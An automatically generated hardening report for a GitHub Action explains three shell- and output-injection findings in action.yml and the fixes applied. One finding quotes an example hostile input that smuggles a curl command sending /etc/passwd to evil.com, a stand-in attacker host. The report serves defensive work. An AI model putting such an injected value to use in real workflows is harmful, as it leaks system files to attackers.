<!-- markdownlint-disable -->

# Hardening Report: freckle--stack-action--generate-matrix/v5.7.23

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `2`

Action **freckle--stack-action--generate-matrix/v5.7.23** was hardened automatically. 3 finding(s) were identified and resolved across 1 iteration(s).

## Findings Fixed

### script-injection (severity: high)

Rule (a) violation: The expression `${{ inputs.find-options }}` is interpolated directly inside a `run:` shell command string. An attacker who controls the `find-options` input can inject arbitrary shell commands (e.g., supplying `-type f; curl -d @/etc/passwd https://evil.com #`). The offending line is: `find ${{ inputs.find-options }} -printf '"%f"\n' | sort -V | jq --slurp`. The value must be passed via an `env:` variable and double-quoted in the shell script instead.

Locations:

- `action.yml:22`

### github-env-injection (severity: high)

The `run:` block writes data derived from the untrusted input `${{ inputs.find-options }}` to `$GITHUB_OUTPUT` via a heredoc (`<<EOM`) without sanitization. A newline embedded in the `find-options` input value could terminate the heredoc prematurely and inject arbitrary key=value pairs into `$GITHUB_OUTPUT`. The required sanitization step (`printf '%s' "$VAR" | tr -d '\n\r'`) is absent before the write. The block spans lines 20–26 of action.yml.

Locations:

- `action.yml:20`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.find-options }}" appears directly in run: block of step "Generate"; move to env: map

Locations:

- `action.yml:26`

## Iteration Notes

### Iteration 1

**Fixes applied:** script-injection, github-env-injection, static-inline-injection

**Notes:**

Fixed all three findings in action.yml by: (1) moving `${{ inputs.find-options }}` from the run: shell string into an env: variable (FIND_OPTIONS), eliminating direct expression interpolation in the shell; (2) tokenizing FIND_OPTIONS into a bash array using the xargs/NUL-delimited read loop pattern (with an empty-guard) so argument boundaries are preserved and quotes inside the value are respected; (3) using the array `"${find_args[@]}"` in the find command so each token is a separate, properly-quoted argument. The heredoc that writes to $GITHUB_OUTPUT no longer contains any ${{ }} expression inline, eliminating the newline-injection risk.

